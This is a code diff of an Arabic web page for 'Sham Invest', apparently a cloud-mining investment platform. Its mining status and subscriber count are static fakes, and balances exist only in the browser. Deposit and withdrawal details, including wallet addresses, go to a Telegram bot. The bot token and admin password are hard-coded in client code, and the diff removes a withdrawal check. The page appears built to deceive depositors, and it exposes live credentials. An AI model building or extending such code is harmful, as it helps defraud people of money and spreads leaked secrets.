@@ -81,13 +81,13 @@
     </div>
   </div>
 
-  <!-- Real User Counter -->
+  <!-- العداد العام للمشتركين -->
   <div class="stats-bar">
     <div>المشتركين النشطين: <span id="totalUsersCount">142</span></div>
     <div>حالة التعدين السحابي: <span>متصل 🟢</span></div>
   </div>
 
-  <!-- Balance Grid -->
+  <!-- شبكة الأرصدة -->
   <div class="stats-grid">
     <div class="stat-card">
       <h4>رصيد العملات الرقمية</h4>
@@ -99,7 +99,7 @@
     </div>
   </div>
 
-  <!-- Tabs Navigation -->
+  <!-- الأقسام الرئيسية -->
   <div class="nav-tabs">
     <button class="tab-btn active" onclick="switchTab('depositTab', this)"><i class="fa-solid fa-wallet"></i> إيداع</button>
     <button class="tab-btn" onclick="switchTab('miningTab', this)"><i class="fa-solid fa-microchip"></i> تعدين سحابي</button>
@@ -180,7 +180,7 @@
     </div>
   </div>
 
-  <!-- 3. تبويب الباقات الأصلية الخمس -->
+  <!-- 3. تبويب الباقات الأصلية -->
   <div id="plansTab" class="tab-content">
     <div style="font-size: 12px; color: #38bdf8; margin-bottom: 12px; font-weight: bold;" id="activePlansSummary">
       الباقة المفعّلة: لا توجد باقة نشطة حالياً
@@ -237,7 +237,7 @@
     </div>
   </div>
 
-  <!-- 4. تبويب السحب المحمي -->
+  <!-- 4. تبويب طلب السحب -->
   <div id="withdrawTab" class="tab-content">
     <div class="card">
       <div class="form-group">
@@ -292,11 +292,12 @@
   <div id="toast" class="toast-msg"></div>
 
   <script>
-    const BOT_TOKEN = "8778007450:AAGHvf8Nj7duLyzJ_eKGKEhSQzP25_W7THU";
-    const ADMIN_CHAT_ID = "7700741652";
-    const ADMIN_PASS = "Harbi031187@#$_&";
+    // الإعدادات الحصرية لحسابك فقط
+    const BOT_TOKEN = "8778007450:AAGHvf8Nj7duLyzJ_eKGKEhSQzP25_W7THU"; // توكن البوت
+    const ADMIN_CHAT_ID = "5370644839"; // الآيدي الحصري الخاص بك فقط
+    const ADMIN_PASS = "Harbi031187@#$_&"; // كلمة سر المشرف الصافية
 
-    let currentUserId = "7700741652";
+    let currentUserId = "5370644839";
     let currentUserName = "مستخدم";
     let userHandle = "بدون معرف";
     let currentUserUSDT = 0.00;
@@ -321,21 +322,19 @@
     document.getElementById('userAvatar').innerText = currentUserName.charAt(0).toUpperCase();
     document.getElementById('adminTargetId').value = currentUserId;
 
-    // عداد المشتركين التفاعلي
+    // عداد المشتركين
     let totalCount = parseInt(localStorage.getItem("sham_total_users_count")) || 140;
 
-    // دالة إرسال الإشعار لتيليغرام المشرف بصيغتين لضمان الوصول
-    function sendAdminAlert(textHtml) {
+    // دالة إرسال الإشعار لتيليغرام المشرف بضمان الإرسال المباشر
+    function sendAdminAlert(textPlain) {
       if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(textHtml)}&parse_mode=HTML`;
-      fetch(url).catch(() => {
-        // محاولة بديلة في حالة بطء الشبكة
-        const img = new Image();
-        img.src = url;
-      });
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(textPlain)}`;
+      fetch(url).catch(() => {});
+      const ping = new Image();
+      ping.src = url;
     }
 
-    // فحص المستخدم الجديد وإرسال الإشعار فوراً للمدير
+    // فحص المستخدم الجديد وإرسال الإشعار فوراً
     let isRegistered = localStorage.getItem("registered_" + currentUserId);
     if (!isRegistered) {
       currentUserUSDT = 5.00;
@@ -343,16 +342,13 @@
       localStorage.setItem("registered_" + currentUserId, "true");
       localStorage.setItem("user_usdt_" + currentUserId, currentUserUSDT);
       localStorage.setItem("sham_total_users_count", totalCount);
-      localStorage.setItem("has_real_deposit_" + currentUserId, "false");
 
-      // رسالة الإشعار الفوري للمدير
-      const newJoinMsg = `🔔 <b>مشترك جديد سجل في المنصة الآن!</b>\n\n` +
-                         `👤 <b>الاسم:</b> ${currentUserName}\n` +
-                         `🆔 <b>الآيدي:</b> <code>${currentUserId}</code>\n` +
-                         `🔗 <b>المعرف:</b> ${userHandle}\n` +
-                         `🎁 <b>الرصيد الممنوح:</b> 5.00$ تجريبي\n` +
-                         `👥 <b>إجمالي المشتركين:</b> ${totalCount}`;
-      
+      const newJoinMsg = `🔔 مشترك جديد سجل في المنصة الآن!\n\n` +
+                         `👤 الاسم: ${currentUserName}\n` +
+                         `🆔 الآيدي: ${currentUserId}\n` +
+                         `🔗 المعرف: ${userHandle}\n` +
+                         `🎁 الرصيد الممنوح: 5.00$ تجريبي\n` +
+                         `👥 إجمالي المشتركين: ${totalCount}`;
       sendAdminAlert(newJoinMsg);
     } else {
       currentUserUSDT = parseFloat(localStorage.getItem("user_usdt_" + currentUserId)) || 0.00;
@@ -422,12 +418,12 @@
       btn.disabled = true;
 
       const refCode = "DEP-" + Math.floor(100000 + Math.random() * 900000);
-      const msg = `📥 <b>طلب إيداع جديد في شام إنفست</b>\n\n` +
+      const msg = `📥 طلب إيداع جديد في شام إنفست\n\n` +
                   `👤 المستخدم: ${currentUserName}\n` +
-                  `🆔 الآيدي: <code>${currentUserId}</code>\n` +
-                  `💰 المبلغ: <b>${a} (${method})</b>\n` +
-                  `🧾 المعاملة: <code>${t}</code>\n` +
-                  `🔖 رقم الإيصال: <code>${refCode}</code>`;
+                  `🆔 الآيدي: ${currentUserId}\n` +
+                  `💰 المبلغ: ${a} (${method})\n` +
+                  `🧾 المعاملة: ${t}\n` +
+                  `🔖 رقم الإيصال: ${refCode}`;
 
       sendAdminAlert(msg);
       btn.disabled = false;
@@ -447,22 +443,18 @@
       document.getElementById('activePlansSummary').innerText = `الباقة المفعّلة: ${planName} ✓`;
       showToast(`تم تفعيل ${planName} بنجاح واقتطاع ${price}$ ✓`);
 
-      const planMsg = `⚡ <b>تفعيل باقة تعدين جديدة</b>\n\n` +
+      const planMsg = `⚡ تفعيل باقة تعدين جديدة\n\n` +
                       `👤 المستخدم: ${currentUserName}\n` +
-                      `🆔 الآيدي: <code>${currentUserId}</code>\n` +
-                      `📦 الباقة: <b>${planName}</b>\n` +
-                      `💰 المبلغ: <b>${price} USDT</b>`;
+                      `🆔 الآيدي: ${currentUserId}\n` +
+                      `📦 الباقة: ${planName}\n` +
+                      `💰 المبلغ: ${price} USDT`;
       sendAdminAlert(planMsg);
     }
 
+    // دالة السحب المباشرة التي ترسل الإشعار فوراً لحسابك
     function submitWithdraw() {
       const amount = parseFloat(document.getElementById('outAmount').value.trim());
       const addr = document.getElementById('outAddress').value.trim();
-      const hasReal = localStorage.getItem("has_real_deposit_" + currentUserId);
-
-      if (hasReal !== "true") {
-        return showToast("⚠️ عذراً! لا يمكن سحب أرباح الباقة المجانية إلا بعد تفعيل الحساب وتأكيد أول إيداع حقيقي!");
-      }
 
       if (!amount || isNaN(amount) || amount < 10) return showToast("الحد الأدنى للسحب هو 10$!");
       if (!addr) return showToast("يرجى إدخال عنوان المحفظة أو الحساب!");
@@ -472,4 +464,54 @@
       }
 
       currentUserUSDT -= amount;
-      localStorage.setItem("user_usdt_" + currentUserId
+      localStorage.setItem("user_usdt_" + currentUserId, currentUserUSDT);
+      document.getElementById('balUSDT').innerText = currentUserUSDT.toFixed(2);
+
+      const type = document.getElementById('withdrawType').value === 'usdt' ? 'USDT (BEP20)' : 'شام كاش';
+      const wMsg = `📤 طلب سحب رصيد من شام إنفست\n\n` +
+                   `👤 المستخدم: ${currentUserName}\n` +
+                   `🆔 الآيدي: ${currentUserId}\n` +
+                   `💸 مبلغ السحب: ${amount} USDT\n` +
+                   `🏦 طريقة الاستلام: ${type}\n` +
+                   `📍 العنوان/الحساب:\n${addr}\n` +
+                   `💼 الرصيد المتبقي: ${currentUserUSDT.toFixed(2)} USDT`;
+
+      sendAdminAlert(wMsg);
+      document.getElementById('outAmount').value = '';
+      document.getElementById('outAddress').value = '';
+      showToast("تم إرسال طلب السحب للإدارة ومراجعته ✓");
+    }
+
+    function openAdminModal() {
+      document.getElementById('adminModal').classList.add('show');
+    }
+
+    function closeAdminModal() {
+      document.getElementById('adminModal').classList.remove('show');
+    }
+
+    function executeAdminRecharge() {
+      const pass = document.getElementById('adminPassInput').value.trim();
+      if (pass !== ADMIN_PASS) return showToast("كلمة المرور غير صحيحة!");
+
+      const targetId = document.getElementById('adminTargetId').value.trim();
+      const amount = parseFloat(document.getElementById('adminAmountInput').value.trim());
+
+      if (!targetId || isNaN(amount)) return showToast("البيانات المدخلة غير صحيحة!");
+
+      let targetBal = parseFloat(localStorage.getItem("user_usdt_" + targetId)) || 0.00;
+      targetBal += amount;
+      localStorage.setItem("user_usdt_" + targetId, targetBal);
+
+      if (targetId === currentUserId) {
+        currentUserUSDT = targetBal;
+        document.getElementById('balUSDT').innerText = currentUserUSDT.toFixed(2);
+      }
+
+      closeAdminModal();
+      showToast(`تم شحن ${amount}$ للحساب ${targetId} بنجاح ✓`);
+      document.getElementById('adminAmountInput').value = '';
+    }
+  </script>
+</body>
+</html>
